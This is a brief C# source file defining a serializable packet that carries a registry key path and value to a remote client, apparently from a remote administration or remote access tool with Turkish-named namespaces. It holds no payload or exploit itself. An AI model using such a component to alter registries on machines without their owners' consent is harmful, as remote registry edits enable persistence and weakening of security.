using System;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.KayıtDefteri;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoChangeRegistryValue : IPacket
    {
        public string KeyPath { get; set; }
        public RegValueData Value { get; set; }

        public DoChangeRegistryValue(string keyPath, RegValueData value)
        {
            KeyPath = keyPath;
            Value = value;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
